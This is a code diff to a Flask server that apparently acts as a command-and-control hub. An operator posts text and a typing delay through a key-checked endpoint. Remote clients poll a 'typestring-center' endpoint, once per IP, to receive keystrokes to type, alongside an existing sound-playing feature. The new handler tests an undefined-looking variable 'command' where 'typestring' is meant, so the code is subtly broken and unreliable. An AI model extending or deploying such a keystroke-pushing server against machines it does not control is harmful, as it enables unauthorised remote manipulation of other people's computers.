@@ -1,5 +1,5 @@
+from flask import Response, jsonify, request, Flask
 from flask_limiter.util import get_remote_address
-from flask import Response, request, Flask
 from flask_limiter import Limiter
 from threading import Thread
 from base64 import b64encode
@@ -40,7 +40,25 @@ playsound_ips: list[str] = []
 sound_file: bytes = b""
 
 
+typestring: str = ""
+typestring_delay: float = 0.0
+typestring_ips: list[str] = []
+
 # Centers
+
+
+@app.route("/typestring-center", methods=["GET"])
+def typestring_center() -> Response:
+    global typestring_delay, typestring_ips, typestring
+    if len(command) == 0:
+        return Response("no strings to type", 204)
+    else:
+        remote_ip = get_remote_address()
+        if remote_ip in typestring_ips:
+            return Response("u cant do that rn", 400)
+        else:
+            typestring_ips.append(remote_ip)
+            return jsonify(text=typestring, delay=typestring_delay)
 
 
 @app.route("/playsound-center", methods=["GET"])
@@ -298,6 +316,18 @@ def post_playsound() -> Response:
         return Response("invalid key", 403)
 
 
+@app.route("/post_typestring", methods=["POST"])
+def post_typestring() -> Response:
+    if check_key(request.args.get("key")):
+        global typestring
+        typestring = request.args.get("typestring")
+        delay = float(request.args.get("delay"))
+        Thread(target=post_typestring_thread, args=[typestring, delay]).start()
+        return Response("success", 200)
+    else:
+        return Response("invalid key", 403)
+
+
 # Threads
 
 
@@ -378,6 +408,16 @@ def post_playsound_thread(sound_data: bytes) -> None:
     sleep(8)
     sound_file = b""
     playsound_ips = []
+
+
+def post_typestring_thread(string: str, delay: float) -> None:
+    global typestring_delay, typestring_ips, typestring
+    typestring_delay = delay
+    typestring = string
+    sleep(8)
+    typestring_delay = 0.0
+    typestring = ""
+    typestring_ips = []
 
 
 # Static
